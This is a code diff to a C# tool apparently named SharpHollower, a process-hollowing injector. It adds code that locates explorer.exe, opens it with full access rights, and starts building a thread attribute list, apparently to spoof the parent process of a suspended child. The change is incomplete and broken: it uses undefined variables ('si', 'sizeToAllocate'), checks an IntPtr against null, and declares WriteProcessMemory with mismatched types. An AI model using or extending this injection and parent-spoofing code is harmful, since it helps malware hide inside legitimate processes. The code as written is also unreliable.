@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.Globalization;
 using System.IO;
 using System.Linq;
@@ -222,22 +223,66 @@ namespace SharpHollower
             }
         }
 
+        [DllImport("kernel32.dll")]
+        public static extern bool WriteProcessMemory(int hProcess, int lpBaseAddress, byte lpBuffer,
+                                         int nSize, int lpNumberOfBytesWritten);
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
         /***
          *  Create a new process using the binary located at "path", starting up suspended.
          */
-        public PROCESS_INFORMATION StartProcess(string path)
+        public unsafe PROCESS_INFORMATION StartProcess(string path)
         {
             STARTUPINFO startInfo = new STARTUPINFO();
             PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();
+            int pid = 0;
+
 
             uint flags = CreateSuspended;// | DetachedProcess | CreateNoWindow;
 
-            if (!CreateProcess((IntPtr)0, path, (IntPtr)0, (IntPtr)0, false, flags, (IntPtr)0, (IntPtr)0, ref startInfo, out procInfo))
+            Process[] procs = Process.GetProcessesByName("explorer");
+            foreach (Process proc in procs)
+            {
+                pid = proc.Id;
+
+            }
+
+            IntPtr processhandle = OpenProcess(0x001F0FFF, false, pid);
+            if (processhandle == null)
+            {
+                Console.WriteLine("OpenProcess failed");
+            }
+            else
+            {
+                Console.WriteLine("PID " + pid + " can be opened");
+            }
+
+
+
+            IntPtr lpSize = IntPtr.Zero;
+            InitializeProcThreadAttributeList(null, 1, 0, ref lpSize);
+            si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, sizeToAllocate);
+
+
+
+            if (!CreateProcess((IntPtr)0, path, (IntPtr)0, (IntPtr)0, true, flags, (IntPtr)0, (IntPtr)0, ref startInfo, out procInfo))
                 throw new SystemException("[x] Failed to create process!");
 
 
             return procInfo;
         }
+
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool InitializeProcThreadAttributeList(
+        string lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);
+
+
+
+
+
+
 
         const ulong PatchSize = 0x10;
 
